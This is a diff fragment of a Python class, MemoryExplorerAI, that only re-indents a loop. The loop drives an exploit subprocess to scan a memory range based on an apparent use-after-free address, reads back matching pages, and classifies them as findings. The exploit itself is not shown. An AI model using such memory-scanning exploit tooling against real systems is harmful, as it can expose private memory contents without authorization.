@@ -341,26 +341,26 @@ class MemoryExplorerAI:
                 try:
                     self.exploit_proc.stdin.write(f"scan {hex(self.uaf_start)} {hex(self.uaf_start + 0x2000000)}\n".encode())
                     self.exploit_proc.stdin.flush()
-                
-                while True:
-                    line = self.exploit_proc.stdout.readline().decode().strip()
-                    if not line: 
-                        # Engine likely died
-                        break
-                    if "SCAN_DONE" in line: 
-                        scan_success = True
-                        break
-                    if "MATCH:" in line:
-                        va = int(line.split(":")[1], 16)
-                        data = self._read_data_packet()
-                        if data:
-                            classification = self.classify_page(data, va)
-                            if classification['confidence'] > 0.5:
-                                if not any(int(item['va'], 16) == va for item in self.found_items):
-                                    self.found_items.append(classification)
-                                    print(f" [!] AI LEARNED: {classification['description']} at {hex(va)}")
-            except Exception as e:
-                print(f"[!] Learning scan failed: {e}")
+                    
+                    while True:
+                        line = self.exploit_proc.stdout.readline().decode().strip()
+                        if not line: 
+                            # Engine likely died
+                            break
+                        if "SCAN_DONE" in line: 
+                            scan_success = True
+                            break
+                        if "MATCH:" in line:
+                            va = int(line.split(":")[1], 16)
+                            data = self._read_data_packet()
+                            if data:
+                                classification = self.classify_page(data, va)
+                                if classification['confidence'] > 0.5:
+                                    if not any(int(item['va'], 16) == va for item in self.found_items):
+                                        self.found_items.append(classification)
+                                        print(f" [!] AI LEARNED: {classification['description']} at {hex(va)}")
+                except Exception as e:
+                    print(f"[!] Learning scan failed: {e}")
             
             # 3. Kill and Cleanup
             for pid in batch_pids:
